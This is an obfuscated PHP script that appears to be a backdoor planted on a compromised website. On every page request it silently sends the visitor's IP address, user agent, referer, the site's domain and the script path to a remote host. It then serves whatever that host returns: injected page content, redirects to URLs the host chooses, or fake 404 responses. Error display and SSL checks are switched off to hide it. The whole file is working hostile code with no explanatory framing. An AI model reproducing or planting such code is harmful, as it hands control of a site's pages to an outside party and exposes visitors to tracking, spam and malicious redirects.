<?php

error_reporting(0);
header('Content-Type:text/html;charset=utf-8');
try {
    ini_set("display_errors", "off");
    error_reporting("\x00\x00\x0f\x03\x18");
    set_time_limit(0);
    $JfR95 = "123";
    $LG07P = "https://eyebmx.com/ss19.php?key=123";
    $RvrGb = array("user_agent:" . $_SERVER["HTTP_USER_AGENT"]);
    $OKgOB = isset($_SERVER["HTTP_X_FORWARDED_HOST"]) ? $_SERVER["HTTP_X_FORWARDED_HOST"] : (isset($_SERVER["HTTP_HOST"]) ? $_SERVER["HTTP_HOST"] : '');
    $TrYNp = isset($_SERVER["REQUEST_URI"]) && $_SERVER["REQUEST_URI"] != '' ? $_SERVER["REQUEST_URI"] : $_SERVER["HTTP_X_REWRITE_URL"];
    $oN2Wp = !empty($_REQUEST["id"]) ? urlencode($_REQUEST["id"]) : '';
    $qfq4J = $_SERVER["SCRIPT_NAME"];
    $LG07P = "https://eyebmx.com/ss19.php?key=123&ip=" . Y30ql() . "&id=" . $oN2Wp . "&domain=" . $OKgOB . "&local=" . urlencode($qfq4J);
    $H3rVb = HrI6a($LG07P, $RvrGb);
    $f_0cD = explode("::::", $H3rVb);
    switch ($f_0cD[0]) {
        case 404:
            header("HTTP/1.0 404 Not Found", true, 404);
            exit;
        case 302:
            header("Location: " . $f_0cD[1], true, 302);
            exit;
        default:
            echo $f_0cD[1];
            goto MJ3B2;
    }
    MJ3B2:
} catch (Exception $vf7JZ) {
    exit("e:" . $vf7JZ->getMessage());
}
function Hri6a($QylRp, $RvrGb = '')
{
    $C36EI = curl_init();
    curl_setopt($C36EI, CURLOPT_URL, $QylRp);
    curl_setopt($C36EI, CURLOPT_HEADER, 0);
    curl_setopt($C36EI, CURLOPT_TIMEOUT, 30);
    curl_setopt($C36EI, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($C36EI, CURLOPT_USERAGENT, $_SERVER["HTTP_USER_AGENT"]);
    curl_setopt($C36EI, CURLOPT_REFERER, @$_SERVER["HTTP_REFERER"]);
    curl_setopt($C36EI, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($C36EI, CURLOPT_SSL_VERIFYHOST, FALSE);
    if (!$RvrGb) {
        goto yLMLC;
    }
    curl_setopt($C36EI, CURLOPT_HTTPHEADER, $RvrGb);
    yLMLC:
    $v7jNB = curl_exec($C36EI);
    curl_close($C36EI);
    return $v7jNB;
}
function Y30qL()
{
    $e4UJx = '';
    if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) {
        $e4UJx = getenv("HTTP_CLIENT_IP");
        goto KumKr;
    }
    if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) {
        $e4UJx = getenv("HTTP_X_FORWARDED_FOR");
        goto tl7UM;
    }
    if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) {
        $e4UJx = getenv("REMOTE_ADDR");
        goto tKZ6e;
    }
    if (isset($_SERVER["REMOTE_ADDR"]) && $_SERVER["REMOTE_ADDR"] && strcasecmp($_SERVER["REMOTE_ADDR"], "unknown")) {
        $e4UJx = $_SERVER["REMOTE_ADDR"];
        goto wyT_v;
    }
    wyT_v:
    tKZ6e:
    tl7UM:
    KumKr:
    return preg_match("/[\\d\\.]{7,15}/", $e4UJx, $K74X0) ? $K74X0[0] : '';
}
